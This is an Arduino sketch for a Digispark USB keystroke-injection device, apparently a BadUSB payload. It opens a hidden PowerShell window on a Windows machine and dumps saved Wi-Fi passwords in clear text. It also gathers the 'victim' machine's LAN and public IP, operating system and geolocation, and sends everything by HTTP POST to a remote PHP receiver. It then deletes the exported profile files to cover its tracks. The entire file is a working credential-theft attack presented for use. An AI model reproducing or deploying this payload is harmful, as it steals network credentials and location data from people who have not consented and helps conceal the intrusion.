#include "DigiKeyboard.h"

void typeLine(const char *line, int delayMs = 500) {
  DigiKeyboard.println(line);
  DigiKeyboard.delay(delayMs);
}

void setup() {
  pinMode(1, OUTPUT); // optional LED
  digitalWrite(1, LOW);

  DigiKeyboard.update();
  DigiKeyboard.delay(2000); // wait for OS to recognize device

  // Open Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);

  // Start PowerShell with no logo, no profile, hidden window
  DigiKeyboard.println("powershell -NoLogo -NoProfile -WindowStyle Hidden");
  DigiKeyboard.delay(1200);

  // Increase console width to avoid weird wraps (optional)
  typeLine("$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size (500,300)", 400);

  // 1) Dump Wi-Fi profiles with clear keys
  typeLine("cd $env:TEMP", 500);
  typeLine("netsh wlan export profile key=clear > $null", 1000);

  // 2) Extract SSID + password from exported XML (current approach: best-effort)
  // Grab first SSID + keyMaterial; you can improve this later
  typeLine("$xml = Get-ChildItem Wi-*.xml | Select-Object -First 1", 600);
  typeLine("if($xml){", 200);
  typeLine(" $x = [xml](Get-Content $xml.FullName);", 400);
  typeLine(" $ssid = $x.WLANProfile.SSIDConfig.SSID.name;", 400);
  typeLine(" $pass = $x.WLANProfile.MSM.security.sharedKey.keyMaterial;", 400);
  typeLine("} else { $ssid='(none)'; $pass='(none)'; }", 700);

  // 3) Victim LAN IP (IPv4)
  typeLine("$lan = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Wi-Fi','Ethernet' -ErrorAction SilentlyContinue | Where-Object {$_.IPAddress -notlike '169.254*'} | Select-Object -First 1).IPAddress", 800);
  typeLine("if(-not $lan){ $lan = '(unknown)'; }", 400);

  // 4) Victim OS
  typeLine("$os = (Get-CimInstance Win32_OperatingSystem).Caption", 600);

  // 5) Public IP
  typeLine("$pub = (Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org').Content", 800);
  typeLine("if(-not $pub){ $pub='(unknown)'; }", 400);

  // 6) GeoIP (latitude / longitude) - replace URL with your chosen API
  // Example expects JSON with 'latitude' and 'longitude' fields
  typeLine("$geo = Invoke-WebRequest -UseBasicParsing \"YOUR_GEOIP_API_URL_HERE?ip=$pub\" -ErrorAction SilentlyContinue", 1000);
  typeLine("if($geo){ $g = $geo.Content | ConvertFrom-Json; $lat = $g.latitude; $lon = $g.longitude; } else { $lat='N/A'; $lon='N/A'; }", 900);

  // 7) LAN extra detail (example: interface alias + prefix length)
  typeLine("$lanExtra = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Wi-Fi','Ethernet' -ErrorAction SilentlyContinue | Where-Object {$_.IPAddress -eq $lan} | Select-Object -First 1)", 800);
  typeLine("if($lanExtra){ $lanExtraStr = $lanExtra.InterfaceAlias + '/' + $lanExtra.PrefixLength; } else { $lanExtraStr = 'N/A'; }", 600);

  // 8) Packet summary placeholder (you’d replace this with real stats if you sniff)
  typeLine("$pkt = 'N/A';", 300);

  // 9) Timestamp
  typeLine("$ts = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')", 400);

  // 10) Build CSV line: Timestamp,SSID,Password,Victim LAN IP,Victim OS,Public IP,LAN extra,Latitude,Longitude,Packet summary
  typeLine("$csv = '\"' + $ts + '\",\"' + $ssid + '\",\"' + $pass + '\",\"' + $lan + '\",\"' + $os + '\",\"' + $pub + '\",\"' + $lanExtraStr + '\",\"' + $lat + '\",\"' + $lon + '\",\"' + $pkt + '\"'", 600);

  // 11) POST to your PHP receiver
  // Replace the URL below with https://your-server/wifi-recv.php
  typeLine("$body = $csv + [Environment]::NewLine", 300);
  typeLine("$utf8 = New-Object System.Text.UTF8Encoding", 300);
  typeLine("$bytes = $utf8.GetBytes($body)", 300);
  typeLine("$req = [System.Net.WebRequest]::Create('https://your-server/wifi-recv.php')", 400);
  typeLine("$req.Method = 'POST'; $req.ContentType = 'text/plain; charset=utf-8'; $req.ContentLength = $bytes.Length", 400);
  typeLine("$stream = $req.GetRequestStream(); $stream.Write($bytes,0,$bytes.Length); $stream.Close()", 600);
  typeLine("$resp = $req.GetResponse(); $resp.Close()", 600);

  // 12) Cleanup temp Wi-* files
  typeLine("del Wi-* /s /f /q 2>$null", 800);

  // 13) Exit PowerShell
  typeLine("exit", 300);

  // Optional LED indication and long delay so it doesn't re-trigger immediately
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(3000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(60000);

  // Stop sending keys
  for (;;) {
    // idle
  }
}

void loop() {
  // not used
}
